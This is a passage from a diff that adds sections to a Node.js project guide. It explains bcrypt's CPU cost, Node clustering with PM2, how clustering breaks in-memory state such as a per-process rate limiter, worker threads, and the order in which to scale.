+### 19.5 Your project's one real CPU cost: bcrypt
+
+Hashing is *designed* to be slow — that is what makes it useful. At 10 salt rounds it costs roughly **100 ms of pure CPU** per register/login.
+
+⚠️ **Correction to [§16.7](#167-how-nodejs-handles-single-threaded-concurrency), which is wrong on this point:** whether that CPU is on your thread depends on **which bcrypt you installed**, and this project has the pure-JavaScript one.
+
+| Package | What it is | Where the 100 ms goes |
+|---------|-----------|----------------------|
+| `bcryptjs` ← **you have this** | pure JavaScript | **your thread.** The async API splits the work into chunks scheduled with `setImmediate`, so other requests get slices in between — better than freezing, but the CPU is still yours |
+| `bcrypt` | native C++ addon | libuv's **thread pool** — genuinely off your event loop |
+
+Your hook is written correctly either way, because it `await`s:
+
+```js
+// models/user.js
+UserSchema.pre('save', async function () {
+    if (!this.isModified('password')) return;
+
+    const salt = await bcrypt.genSalt(10);          // await, not genSaltSync
+    this.password = await bcrypt.hash(this.password, salt);
+});
+```
+
+> Never the `*Sync` variants here. `bcrypt.hashSync` would hard-block the server for 100 ms on every registration.
+>
+> **Cheapest real win available to you:** swap `bcryptjs` for `bcrypt`. Same API, same `await`s, and the hashing leaves your event loop. It is a native build, which is the only reason `bcryptjs` exists.
+
+---
+
+### 19.6 Cluster — what it actually is
+
+**One process runs on one core.** Your machine has more. `cluster` starts N copies of your app — a **primary** that forks **workers**, all sharing one listening port, with the OS handing each new connection to one of them.
+
+```text
+                        :3005
+                          │
+                 ┌────────┴────────┐
+                 │  primary (fork  │   no requests, just supervises
+                 │  + respawn)     │
+                 └────────┬────────┘
+        ┌────────────┬────┴───────┬────────────┐
+   worker 1     worker 2     worker 3     worker 4
+   own event    own event    own event    own event
+   loop, own    loop, own    loop, own    loop, own
+   memory       memory       memory       memory
+```
+
+**Separate processes, not threads** — no shared variables, no shared memory. Four cores ≈ four times the throughput, and one worker crashing or blocking no longer takes the whole site down.
+
+```js
+// cluster.js — you would run this instead of app.js
+const cluster = require('node:cluster');
+const os = require('node:os');
+
+if (cluster.isPrimary) {
+    for (let i = 0; i < os.availableParallelism(); i++) cluster.fork();
+
+    cluster.on('exit', (worker) => {
+        console.error(`worker ${worker.process.pid} died — restarting`);
+        cluster.fork();
+    });
+} else {
+    require('./app');   // each worker runs your app unchanged
+}
+```
+
+**In practice you don't write that file.** PM2 or your host does it:
+
+```bash
+pm2 start app.js -i max     # one worker per core, restarts, log handling
+```
+
+What clustering does and does not fix:
+
+| | |
+|---|---|
+| ✅ uses all your cores | 4 cores instead of 1 |
+| ✅ survives a crash | the primary respawns the worker |
+| ✅ survives one blocked worker | the other three keep serving |
+| ❌ makes a single request faster | one request still runs on one core |
+| ❌ removes the blocking rule | now you have four blockable lanes instead of one |
+| ❌ helps a database bottleneck | four workers hammer the same Mongo harder |
+
+---
+
+### 19.7 Do you need code changes? Almost none — except these
+
+The clustering itself needs no changes to your controllers. What breaks is **anything you kept in a variable**, because each worker has its own copy of everything.
+
+| Thing | What happens with 4 workers | Fix |
+|-------|-----------------------------|-----|
+| ⚠️ **rate limiter** (`middleware/rateLimit.js`) | counters are in memory, per process, so a client gets **4 × 10 = 40** requests instead of 10 — silently | a shared store: `rate-limit-redis` |
+| ⚠️ **`User.syncIndexes()`** in `app.js` | runs **4 times** on every boot, once per worker | harmless, but guard it with `cluster.isPrimary` to keep startup clean |
+| in-memory cache (when you add one) | 4 separate caches, 4× the misses, inconsistent reads | Redis |
+| `logs/access.log` | 4 processes appending; lines survive but interleave | add the pid to the format, or log to stdout and let the platform collect |
+| console output | interleaved from 4 workers | same — include `process.pid` |
+| WebSockets / in-memory sessions | a client's second connection may land on a different worker | sticky sessions, or move state out |
+| graceful shutdown | each worker must close its own server and Mongo connection | handle `SIGTERM` inside the worker |
+
+✅ **What is already safe:** JWT auth is **stateless** — any worker can verify any token, because nothing about the session lives in memory. Mongo connections are per-worker, which is fine. This is the payoff of the design in [§8d](#8d-jwt-lifecycle--sign-verify-requser).
+
+> The pattern to remember: **clustering turns every piece of local state into a bug.** That is the real cost, not the fork call.
+
+---
+
+### 19.8 Worker threads — the other tool, for a different problem
+
+`worker_threads` gives you extra threads **inside one process**, for CPU work that would otherwise block. Not for handling more users — for getting one expensive job off the event loop.
+
+```js
+// main side
+const { Worker } = require('node:worker_threads');
+
+const runJob = (data) => new Promise((resolve, reject) => {
+    const worker = new Worker('./heavy-job.js', { workerData: data });
+    worker.on('message', resolve);
+    worker.on('error', reject);
+});
+
+// heavy-job.js
+const { parentPort, workerData } = require('node:worker_threads');
+parentPort.postMessage(crunch(workerData));   // event loop stays free
+```
+
+**This one does need code changes** — the expensive function moves into its own file and you talk to it by passing messages, so anything sharing closures or module state has to be restructured.
+
+Choosing between the three:
+
+| Tool | Use it for | Your app |
+|------|-----------|----------|
+| **async / await** (default) | anything that waits: db, HTTP, files | everything you have |
+| **cluster / PM2** | using all cores, crash isolation | the next real step, when traffic justifies it |
+| **worker_threads** | image resize, PDF/report generation, big crunching | nothing today |
+
+For genuinely long jobs (a minute of work, a nightly report), neither one is the answer — that is a **job queue** (BullMQ + Redis): the request returns `202 Accepted` immediately and a separate worker process does the work.
+
+---
+
+### 19.9 The order to do things in
+
+1. **Measure before scaling.** Event-loop lag and p95 latency ([§15](#15-api-performance--observability--the-vocabulary-and-the-loop)). Slow *and* idle CPU means the database or a missing index — more processes will not help.
+2. **Fix blocking first.** Swap `bcryptjs` → `bcrypt`, keep sync calls out of request paths.
+3. **Add indexes.** Almost always the biggest win in an app like this.
+4. **Then cluster** — via PM2 or your host, and move the rate limiter to Redis in the same change, or your limits quietly multiply.
+5. **Then more machines** behind a load balancer, which is when `/health` ([§12](#12-request-logging-morgan--health-check)) starts earning its keep and `app.set('trust proxy', 1)` ([§18](#18-what-is-an-api-gateway)) becomes mandatory.
+6. **worker_threads or a queue** only when you actually have CPU-heavy or long-running work.
+
+---
+
+### One-line summary
+
+**One Node thread already serves hundreds of users because your JavaScript runs for well under a millisecond per request and spends the rest waiting on Mongo — waiting is done by the OS, not by you. The single rule is that synchronous CPU work freezes everyone, which is why `bcryptjs` (pure JS, on your thread) is worth swapping for native `bcrypt`. `cluster`/PM2 then runs one process per core for throughput and crash isolation, needing no controller changes but immediately breaking in-memory state — your per-process rate limiter would give every client 4× its limit. `worker_threads` is unrelated: extra threads for CPU-bound jobs you don't have yet.**
+
+See also: [§11 rate limiting](#11-rate-limiting--what-it-is-strategies-what-we-use), [§12 morgan + health check](#12-request-logging-morgan--health-check), [§15 performance & observability](#15-api-performance--observability--the-vocabulary-and-the-loop), [§16.5 backpressure](#165-surviving-traffic-spikes-with-backpressure), [§16.6 scaling with threads and processes](#166-scaling-nodejs-with-threads-processes-and-clustering).
 
